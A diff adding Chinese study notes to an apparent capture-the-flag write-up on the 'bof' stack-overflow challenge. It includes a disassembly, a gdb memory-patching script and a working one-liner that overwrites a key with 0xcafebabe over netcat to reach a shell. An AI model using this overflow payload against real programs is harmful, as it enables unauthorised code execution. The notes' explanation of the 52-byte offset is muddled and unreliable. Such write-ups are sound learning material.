@@ -157,13 +157,123 @@ bof@ubuntu:~$ checksec ./bof
     Stripped:   No
 ```
 
+32bit的小端序.
 
+Relocation Read Only---防止GOT劫持攻击.
 
+No execute---数据堆栈不可以执行---可能只能ROP攻击(不能在栈上面攻击)
 
+ASLR:Position Independent Executable 地址随机化的一种.
 
+发现有Canary的保护.
 
+Stripped:符号表没有剥离,能看到函数名.
 
+逆向:
 
+```asm
+000011fd <func>:
+    11fd:       55                      push   %ebp
+    11fe:       89 e5                   mov    %esp,%ebp
+    1200:       56                      push   %esi
+    1201:       53                      push   %ebx
+    1202:       83 ec 30                sub    $0x30,%esp #分配了48个bytes给这个func
+    1205:       e8 f6 fe ff ff          call   1100 <__x86.get_pc_thunk.bx>
+    120a:       81 c3 f6 2d 00 00       add    $0x2df6,%ebx
+    1210:       65 a1 14 00 00 00       mov    %gs:0x14,%eax #canary
+    1216:       89 45 f4                mov    %eax,-0xc(%ebp)
+    1219:       31 c0                   xor    %eax,%eax
+    121b:       83 ec 0c                sub    $0xc,%esp
+    121e:       8d 83 08 e0 ff ff       lea    -0x1ff8(%ebx),%eax
+    1224:       50                      push   %eax
+    1225:       e8 26 fe ff ff          call   1050 <printf@plt>
+    122a:       83 c4 10                add    $0x10,%esp
+    122d:       83 ec 0c                sub    $0xc,%esp
+    1230:       8d 45 d4                lea    -0x2c(%ebp),%eax
+    1233:       50                      push   %eax
+    1234:       e8 27 fe ff ff          call   1060 <gets@plt>
+    1239:       83 c4 10                add    $0x10,%esp
+    123c:       81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)
+    1243:       75 2d                   jne    1272 <func+0x75>
+    1245:       e8 36 fe ff ff          call   1080 <getegid@plt>
+    124a:       89 c6                   mov    %eax,%esi
+    124c:       e8 2f fe ff ff          call   1080 <getegid@plt>
+    1251:       83 ec 08                sub    $0x8,%esp
+    1254:       56                      push   %esi
+    1255:       50                      push   %eax
+    1256:       e8 55 fe ff ff          call   10b0 <setregid@plt>
+    125b:       83 c4 10                add    $0x10,%esp
+    125e:       83 ec 0c                sub    $0xc,%esp
+    1261:       8d 83 17 e0 ff ff       lea    -0x1fe9(%ebx),%eax
+    1267:       50                      push   %eax
+    1268:       e8 33 fe ff ff          call   10a0 <system@plt>
+    126d:       83 c4 10                add    $0x10,%esp
+    1270:       eb 12                   jmp    1284 <func+0x87>
+    1272:       83 ec 0c                sub    $0xc,%esp
+    1275:       8d 83 1f e0 ff ff       lea    -0x1fe1(%ebx),%eax
+    127b:       50                      push   %eax
+    127c:       e8 0f fe ff ff          call   1090 <puts@plt>
+    1281:       83 c4 10                add    $0x10,%esp
+    1284:       90                      nop
+    1285:       8b 45 f4                mov    -0xc(%ebp),%eax
+    1288:       65 2b 05 14 00 00 00    sub    %gs:0x14,%eax
+    128f:       74 05                   je     1296 <func+0x99>
+    1291:       e8 4a 00 00 00          call   12e0 <__stack_chk_fail_local>
+    1296:       8d 65 f8                lea    -0x8(%ebp),%esp
+    1299:       5b                      pop    %ebx
+    129a:       5e                      pop    %esi
+    129b:       5d                      pop    %ebp
+    129c:       c3                      ret    
+
+0000129d <main>:
+    129d:       8d 4c 24 04             lea    0x4(%esp),%ecx
+    12a1:       83 e4 f0                and    $0xfffffff0,%esp
+    12a4:       ff 71 fc                push   -0x4(%ecx)
+    12a7:       55                      push   %ebp
+    12a8:       89 e5                   mov    %esp,%ebp
+    12aa:       51                      push   %ecx
+    12ab:       83 ec 04                sub    $0x4,%esp
+    12ae:       e8 22 00 00 00          call   12d5 <__x86.get_pc_thunk.ax>
+    12b3:       05 4d 2d 00 00          add    $0x2d4d,%eax
+    12b8:       83 ec 0c                sub    $0xc,%esp
+    12bb:       68 ef be ad de          push   $0xdeadbeef
+    12c0:       e8 38 ff ff ff          call   11fd <func>
+    12c5:       83 c4 10                add    $0x10,%esp
+    12c8:       b8 00 00 00 00          mov    $0x0,%eax
+    12cd:       8b 4d fc                mov    -0x4(%ebp),%ecx
+    12d0:       c9                      leave  
+    12d1:       8d 61 fc                lea    -0x4(%ecx),%esp
+    12d4:       c3                      ret    
+```
+
+可以在pwndgb中直接查看canary的值.
+
+???怎么这么难......
+
+就是简单的栈溢出,但是把问题想复杂了,不难,因为不用检查canary.
+
+​	下面的情况是如果你想修改根据程序实时修改canary的值要进行的操作,就是在get之前直接修改内存的值.
+
+```py
+python
+payload = b"A"*36 + b"\xbb\xbb\xbb\xbb" + b"\xcc"*16 + b"\xbe\xba\xfe\xca"
+buf_addr = int(gdb.parse_and_eval("$ebp-0x30"))
+for i, byte in enumerate(payload):
+    gdb.execute(f"set {{unsigned char}} ({buf_addr}+{i}) = {byte}")
+end
+```
+
+那么其实了解了栈的分布了之后:
+
+```sh
+bof@ubuntu:~$ ( python3 -c 'import sys; sys.stdout.buffer.write(
+    b"A"*52 + b"\xbe\xba\xfe\xca" + b"\n"
+)'; cat ) | nc 0 9000
+```
+
+返回地址占4bytes + 临时栈分配48bytes
+
+​	和起来就52bytes.在这之前就是我们分配的key,直接覆盖就可以了,破解获取了脚本之后传给nc终端,就能获取root控制权,获取flag.
 
 
 
